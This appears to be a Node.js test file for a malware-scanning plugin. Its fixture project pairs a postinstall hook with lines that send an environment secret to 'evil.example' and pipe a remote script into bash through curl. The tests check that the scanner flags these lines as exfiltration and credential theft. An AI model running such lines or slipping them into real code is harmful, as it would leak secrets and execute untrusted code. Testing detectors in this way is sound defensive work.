import test from 'node:test'
import assert from 'node:assert/strict'
import { mkdtempSync, writeFileSync, mkdirSync, rmSync } from 'node:fs'
import { tmpdir } from 'node:os'
import { join } from 'node:path'

const { apply } = await import('../lib/index.js')

function makeCtx() {
  const tools = []
  tools.register = (t) => tools.push(t)
  return { tools }
}

function makeFixture() {
  const dir = mkdtempSync(join(tmpdir(), 'doctor-test-'))
  writeFileSync(join(dir, 'package.json'), JSON.stringify({
    name: 'fixture', version: '1.0.0',
    scripts: { postinstall: 'node setup.js' },
  }))
  writeFileSync(join(dir, 'index.js'), [
    "const key = process.env.SECRET_KEY",
    "fetch('https://evil.example/collect?k=' + key)",
    "child_process.exec('curl -s http://x.y/z | bash')",
  ].join('\n'))
  writeFileSync(join(dir, 'clean.js'), 'export const x = 1\n')
  return dir
}

test('registers two tools', () => {
  const ctx = makeCtx()
  apply(ctx)
  assert.deepEqual(ctx.tools.map((t) => t.name).sort(), ['doctor_scan', 'doctor_scan_path'])
})

test('flags exfil, credentials, and lifecycle in fixture', async () => {
  const ctx = makeCtx()
  apply(ctx)
  const dir = makeFixture()
  const tool = ctx.tools.find((t) => t.name === 'doctor_scan')
  const r = await tool.execute({ path: dir })
  assert.equal(r.ok, true)
  assert.ok(r.hits >= 2, 'expected at least exfil + credential hits')
  assert.ok(r.lifecycle.length === 1 && r.lifecycle[0].script === 'postinstall')
  assert.notEqual(r.verdict, 'SAFE')
  const rules = new Set(r.results.flatMap((x) => x.hits.map((h) => h.rule)))
  assert.ok(rules.has('exfil-http') || rules.has('exfil-shell-net'))
  assert.ok(rules.has('cred-secrets'))
  rmSync(dir, { recursive: true, force: true })
})

test('clean dir is SAFE', async () => {
  const ctx = makeCtx()
  apply(ctx)
  const dir = mkdtempSync(join(tmpdir(), 'doctor-clean-'))
  writeFileSync(join(dir, 'ok.js'), 'export const y = 2\n')
  const tool = ctx.tools.find((t) => t.name === 'doctor_scan')
  const r = await tool.execute({ path: dir })
  assert.equal(r.ok, true)
  assert.equal(r.verdict, 'SAFE')
  assert.equal(r.hits, 0)
  rmSync(dir, { recursive: true, force: true })
})

test('rejects relative paths', async () => {
  const ctx = makeCtx()
  apply(ctx)
  const tool = ctx.tools.find((t) => t.name === 'doctor_scan')
  await assert.rejects(() => tool.execute({ path: '../x' }), /absolute/)
})